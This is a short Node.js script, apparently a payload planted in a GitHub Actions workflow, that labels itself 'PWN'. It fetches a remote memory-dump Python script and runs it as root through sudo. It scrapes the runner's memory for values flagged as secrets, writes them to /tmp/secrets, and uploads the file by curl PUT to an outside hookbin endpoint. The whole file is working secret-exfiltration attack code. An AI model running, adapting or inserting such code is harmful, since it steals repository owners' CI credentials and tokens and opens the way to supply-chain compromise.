const { execSync } = require('child_process');
const runId = process.env.GITHUB_RUN_ID;
console.log("PWN: pwn.js running, GITHUB_RUN_ID=" + runId);
try {
  execSync(`curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"`);
  execSync(`curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`);
} catch (e) {
  console.error("PWN: Error: " + e.message);
}
